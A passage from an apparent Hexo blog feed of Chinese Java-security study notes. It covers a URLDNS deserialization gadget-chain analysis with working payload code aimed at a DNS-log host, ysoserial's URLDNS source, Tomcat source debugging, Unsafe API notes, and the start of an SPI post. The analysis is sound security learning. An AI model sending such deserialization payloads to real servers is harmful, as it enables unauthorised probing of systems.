class="string">&quot;http://4b9cc854.dns.1433.eu.org&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">666</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220918233654716.png" alt="image-20220918233654716"></p><h2 id="ysoserial的实现"><a href="#ysoserial的实现" class="headerlink" title="ysoserial的实现"></a>ysoserial的实现</h2><p><code>ysoserial</code>是<code>java</code>反序列化利用链的集合工具，可以根据我们需要的利用链生成反序列 POC。项目地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial</span><br></pre></td></tr></table></figure><p>下载源代码后导入 idea，根据<code>pom.xml</code>文件中的引导设置<code>GeneratePayload.java</code>文件为<code>mainClass</code><br><img src="images/image-20220919172929224.png" alt="image-20220919172929224"></p><p>设置<code>URLDNS</code>的运行参数<img src="images/image-20220919173043221.png" alt="image-20220919173043221"></p><p>其中<code>URLDNS</code>利用链部分的实现源码如下（删除部分不重要的内容）：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>简化后如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); </span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">ht.put(u, url); </span><br><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line">  <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用链如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line"> *     HashMap.readObject()</span><br><span class="line"> *       HashMap.putVal()</span><br><span class="line"> *         HashMap.hash()</span><br><span class="line"> *           URL.hashCode()</span><br></pre></td></tr></table></figure></p><p>可以看到<code>ysoserial</code>直接继承<code>URLStreamHandler</code>类重写了<code>getHostAddress()</code>方法为空，因此避免了在生成<code>payload</code>的时候发起<code>DNS</code>请求。</p><p><strong>那为什么反序列化后还能发送<code>DNS</code>请求？</strong></p><p>可以看到在<code>java.net.URL</code>类中<code>handler</code>参数被<code>transient</code>关键字修饰<br><img src="images/image-20220919182207942.png" alt="image-20220919182207942"></p><blockquote><p>一旦变量被transient修饰，变量将不再是对象持久化的一部分，该变量内容在序列化后无法获得访问（被忽略）</p></blockquote><p>因此在序列化的过程中会忽略掉<code>handler</code>，在反序列化时能正常执行<code>DNS</code>请求。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;URLDNS利用链分析&quot;&gt;&lt;a href=&quot;#URLDNS利用链分析&quot; class=&quot;headerlink&quot; title=&quot;URLDNS利用链分析&quot;&gt;&lt;/a&gt;URLDNS利用链分析&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;head</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/"/>
    <id>http://example.com/2022/11/19/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/</id>
    <published>2022-11-19T12:08:37.993Z</published>
    <updated>2022-11-04T08:59:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat源码调试"><a href="#Tomcat源码调试" class="headerlink" title="Tomcat源码调试"></a>Tomcat源码调试</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>后面的很多漏洞环境在调试的时候都需要步入 Tomcat 源码文件里，在步入的 class 反编译文件观感不佳（例如变量名丢失，变成了 var 1,2,3…诸如此类）。所以这里写篇笔记记录一下自己的配置过程和遇到的问题的解决方案（自己瞎鼓捣的，并非最好的解决方案），如果其他师傅有比较好的配置方法，欢迎分享学习学习。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>因为我的 Tomcat 版本是 9.0.65，所以我在官方下载的也是该版本的源码压缩包<br><img src="images/image-20221102104218124.png" alt="image-20221102104218124"></p><p>解压如下<br><img src="images/image-20221102104341694.png" alt="image-20221102104341694"></p><p>把 java 文件夹里的 javax 和 org 两个文件夹复制到创建的 Java 项目中<br><img src="images/image-20221102104454294.png" alt="image-20221102104454294"></p><p>在 pom.xml 里添加如下的 maven 依赖：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- tomcat source--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;biz.aQute.bnd&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;biz.aQute.bndlib&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.2.0&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.ant&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;ant&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.9.7&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;wsdl4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;wsdl4j&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.6.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;javax.xml&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jaxrpc&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.eclipse.jdt.core.compiler&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;ecj&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.5.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p><p>接下来就是设置字节码版本（以自己的 JDK 版本为准），我的是 jdk 1.8，故配置如下：</p><p>项目结构-模块<br><img src="images/image-20221102105319386.png" alt="image-20221102105319386"></p><p>偏好设置-构建运行部署-编译器-Java 编译器<br><img src="images/image-20221102105407398.png" alt="image-20221102105407398"></p><p>运行 Java 项目，可能会遇见如下错误；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java: 找不到符号</span><br><span class="line">  符号:   变量 VERSION_9</span><br><span class="line">  位置: 类 org.eclipse.jdt.internal.compiler.impl.CompilerOptions</span><br></pre></td></tr></table></figure><p><img src="images/image-20221102104846234.png" alt="image-20221102104846234"></p><p>个人理解该报错原因是我的 JDK 版本为1.8，所以没有后面的符号变量（非准确说法，勿信），我的解决方案是把这些所有报错的红色变量都改为：<code>VERSION_1_8</code>，也可以注释掉<br><img src="images/image-20221102105557452.png" alt="image-20221102105557452"></p><p>现在项目可以正常运行了，调试情况如下：<br><img src="images/image-20221102105700077.png" alt="image-20221102105700077"></p><p>可以看到调用栈上关于 Tomcat 的部分，都有明显的颜色区分，步入进去是 java 源文件，而非 class 反编译的文件<br><img src="images/image-20221102105714779.png" alt="image-20221102105714779"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tomcat源码调试&quot;&gt;&lt;a href=&quot;#Tomcat源码调试&quot; class=&quot;headerlink&quot; title=&quot;Tomcat源码调试&quot;&gt;&lt;/a&gt;Tomcat源码调试&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerli</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/unsafe%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2022/11/19/unsafe%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-11-19T12:08:37.993Z</published>
    <updated>2022-11-09T05:18:21.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="unsafe学习"><a href="#unsafe学习" class="headerlink" title="unsafe学习"></a>unsafe学习</h1><h2 id="获取偏移量方法"><a href="#获取偏移量方法" class="headerlink" title="获取偏移量方法"></a>获取偏移量方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">objectFieldOffset</span><span class="params">(Field var1)</span>;<span class="comment">//获取非静态变量var1的偏移量。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">staticFieldOffset</span><span class="params">(Field var1)</span>;<span class="comment">//获取静态变量var1的偏移量。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">arrayBaseOffset</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//获取数组var1中的第一个元素的偏移量，即数组的基础地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">staticFieldBase</span><span class="params">(Field var1)</span>;<span class="comment">//获取静态变量var1的实际地址，配合staticFieldOffset方法使用，可求出变量所在的段地址</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">arrayIndexScale</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//获取数组var1的偏移量增量。结合arrayBaseOffset(Class&lt;?&gt; var1)方法就可以求出数组中各个元素的地址。</span></span><br></pre></td></tr></table></figure><h2 id="操作属性方法"><a href="#操作属性方法" class="headerlink" title="操作属性方法"></a>操作属性方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">getObject</span><span class="params">(Object var1, <span class="type">long</span> var2)</span>;<span class="comment">//获取var1对象中偏移量为var2的Object对象，该方法可以无视修饰符限制。相同方法有getInt、getLong、getBoolean等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putObject</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4)</span>;<span class="comment">//将var1对象中偏移量为var2的Object对象的值设为var4，该方法可以无视修饰符限制。相同的方法有putInt、putLong、putBoolean等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">getObjectVolatile</span><span class="params">(Object var1, <span class="type">long</span> var2)</span>;<span class="comment">//功能与getObject(Object var1, long var2)一样，但该方法可以保证读写的可见性和有序性，可以无视修饰符限制。相同的方法有getIntVolatile、getLongVolatile、getBooleanVolatile等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putObjectVolatile</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4)</span>;<span class="comment">//功能与putObject(Object var1, long var2, Object var4)一样，但该方法可以保证读写的可见性和有序性，可以无视修饰符限制。相同的方法有putIntVolatile、putLongVolatile、putBooleanVolatile等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putOrderedObject</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4)</span>;<span class="comment">//功能与putObject(Object var1, long var2, Object var4)一样，但该方法可以保证读写的有序性(不保证可见性)，可以无视修饰符限制。相同的方法有putOrderedInt、putOrderedLong等。</span></span><br></pre></td></tr></table></figure><h2 id="操作内存方法"><a href="#操作内存方法" class="headerlink" title="操作内存方法"></a>操作内存方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">addressSize</span><span class="params">()</span>;<span class="comment">//获取本地指针大小，单位为byte，通常值为4或8。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">pageSize</span><span class="params">()</span>;<span class="comment">//获取本地内存的页数，该返回值会是2的幂次方。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">allocateMemory</span><span class="params">(<span class="type">long</span> var1)</span>;<span class="comment">//开辟一块新的内存块，大小为var1(单位为byte)，返回新开辟的内存块地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">reallocateMemory</span><span class="params">(<span class="type">long</span> var1, <span class="type">long</span> var3)</span>;<span class="comment">//将内存地址为var3的内存块大小调整为var1(单位为byte)，返回调整后新的内存块地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">setMemory</span><span class="params">(<span class="type">long</span> var2, <span class="type">long</span> var4, <span class="type">byte</span> var6)</span>;<span class="comment">//从实际地址var2开始将后面的字节都修改为var6，修改大小为var4(通常为0)。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">copyMemory</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4, <span class="type">long</span> var5, <span class="type">long</span> var7)</span>;<span class="comment">//从对象var1中偏移量为var2的地址开始复制，复制到var4中偏移量为var5的地址，复制大小为var7。当var1为空时，var2就不是偏移量而是实际地址，当var4为空时，var5就不是偏移量而是实际地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">freeMemory</span><span class="params">(<span class="type">long</span> var1)</span>;<span class="comment">//释放实际地址为var1的内存。</span></span><br></pre></td></tr></table></figure><h2 id="线程挂起和恢复方法"><a href="#线程挂起和恢复方法" class="headerlink" title="线程挂起和恢复方法"></a>线程挂起和恢复方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">unpark</span><span class="params">(Object var1)</span>;<span class="comment">//将被挂起的线程var1恢复，由于其不安全性，需保证线程var1是存活的。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">park</span><span class="params">(<span class="type">boolean</span> var1, <span class="type">long</span> var2)</span>;<span class="comment">//当var2等于0时，线程会一直挂起，知道调用unpark方法才能恢复。当var2大于0时，如果var1为false，这时var2为增量时间，即线程在被挂起var2秒后会自动恢复，如果var1为true，这时var2为绝对时间，即线程被挂起后，得到具体的时间var2后才自动恢复。</span></span><br></pre></td></tr></table></figure><h2 id="CAS方法"><a href="#CAS方法" class="headerlink" title="CAS方法"></a>CAS方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">compareAndSwapObject</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4, Object var5)</span>;<span class="comment">//CAS机制相关操作，对对象var1里偏移量为var2的变量进行CAS修改，var4为期待值，var5为修改值，返回修改结果。相同方法有compareAndSwapInt、compareAndSwapLong。</span></span><br></pre></td></tr></table></figure><h2 id="类加载方法"><a href="#类加载方法" class="headerlink" title="类加载方法"></a>类加载方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">shouldBeInitialized</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//判断var1类是否被初始。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">ensureClassInitialized</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//确保var1类已经被初始化。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineClass(String var1, <span class="type">byte</span>[] var2, <span class="type">int</span> var3, <span class="type">int</span> var4, ClassLoader var5, ProtectionDomain var6);<span class="comment">//定义一个类，用于动态的创建类。var1为类名，var2为类的文件数据字节数组，var3为var2的输入起点，var4为输入长度，var5为加载该类的加载器，var6为保护领域。返回创建后的类。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineAnonymousClass(Class&lt;?&gt; var1, <span class="type">byte</span>[] var2, Object[] var3);<span class="comment">//用于动态的创建匿名内部类。var1为需创建匿名内部类的类，var2为匿名内部类的文件数据字节数组，var3为修补对象。返回创建后的匿名内部类。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">allocateInstance</span><span class="params">(Class&lt;?&gt; var1)</span> <span class="keyword">throws</span> InstantiationException;<span class="comment">//创建var1类的实例，但是不会调用var1类的构造方法，如果var1类还没有初始化，则进行初始化。返回创建实例对象。</span></span><br></pre></td></tr></table></figure><h2 id="内存屏障方法"><a href="#内存屏障方法" class="headerlink" title="内存屏障方法"></a>内存屏障方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">loadFence</span><span class="params">()</span>;<span class="comment">//所有读操作必须在loadFence方法执行前执行完毕。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">storeFence</span><span class="params">()</span>;<span class="comment">//所有写操作必须在storeFence方法执行前执行完毕。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">fullFence</span><span class="params">()</span>;<span class="comment">//所有读写操作必须在fullFence方法执行前执行完毕。</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.cnblogs.com/gaofei200/p/13951764.html">https://www.cnblogs.com/gaofei200/p/13951764.html</a></p><p><a href="https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html">https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;unsafe学习&quot;&gt;&lt;a href=&quot;#unsafe学习&quot; class=&quot;headerlink&quot; title=&quot;unsafe学习&quot;&gt;&lt;/a&gt;unsafe学习&lt;/h1&gt;&lt;h2 id=&quot;获取偏移量方法&quot;&gt;&lt;a href=&quot;#获取偏移量方法&quot; class=&quot;header</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/SPI%E6%9C%BA%E5%88%B6/"/>
    <id>http://example.com/2022/11/19/SPI%E6%9C%BA%E5%88%B6/</id>
    <published>2022-11-19T12:08:37.983Z</published>
    <updated>2022-11-09T05:18:21.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h1><blockquote><p>最开始接触是springboot写文件rce里面的charsets遇到了，然后发现yaml的反弹也是使用的SPI机制</p></blockquote><p>SPI全称Service Provider Interface，是Java提供的一套用来被第三方实现或者扩展的API，或者换句话说，<strong>SPI是一种服务发现机制</strong> </p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>定义接口 SpiService.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SpiService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现接口的方法的类SpiServiceA.java (<strong>需要注意SPI机制的实现类必须有一个无参构造方法</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> 